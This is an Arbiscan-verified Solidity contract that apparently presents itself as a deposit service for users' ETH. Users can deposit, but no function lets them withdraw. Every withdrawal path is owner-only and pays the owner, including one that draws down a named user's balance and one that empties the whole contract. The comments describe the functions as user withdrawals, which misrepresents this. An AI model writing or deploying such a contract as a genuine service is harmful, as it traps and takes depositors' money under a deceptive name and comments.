/**
 *Submitted for verification at Arbiscan.io on 2024-05-16
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract UserAuthorizedWorkAndDeposit {
    address public owner;
    mapping(address => uint256) public userBalances;

    constructor() {
        owner = msg.sender;
    }

    // Function to authorize the contract to work with user's ETH
    function authorizeWorkAndDeposit() external payable {
        require(msg.value > 0, "Invalid deposit amount");
        userBalances[msg.sender] += msg.value;
    }

    // Function to withdraw funds from user's balance
    function withdraw(uint256 amount) external {
        require(msg.sender == owner, "Only the owner can perform this action");
        require(address(this).balance >= amount, "Insufficient contract balance");
        payable(owner).transfer(amount);
    }

    // Function to withdraw funds from user's balance
    function withdrawFromUser(address user, uint256 amount) external {
        require(msg.sender == owner, "Only the owner can perform this action");
        require(userBalances[user] >= amount, "Insufficient user balance");
        userBalances[user] -= amount;
        payable(owner).transfer(amount);
    }

    // Function to get user's balance
    function getUserBalance(address user) external view returns (uint256) {
        return userBalances[user];
    }

    // Function to withdraw all funds from the contract to the owner's wallet
    function withdrawAllToOwner() external {
        require(msg.sender == owner, "Only the owner can perform this action");
        uint256 contractBalance = address(this).balance;
        payable(owner).transfer(contractBalance);
    }
}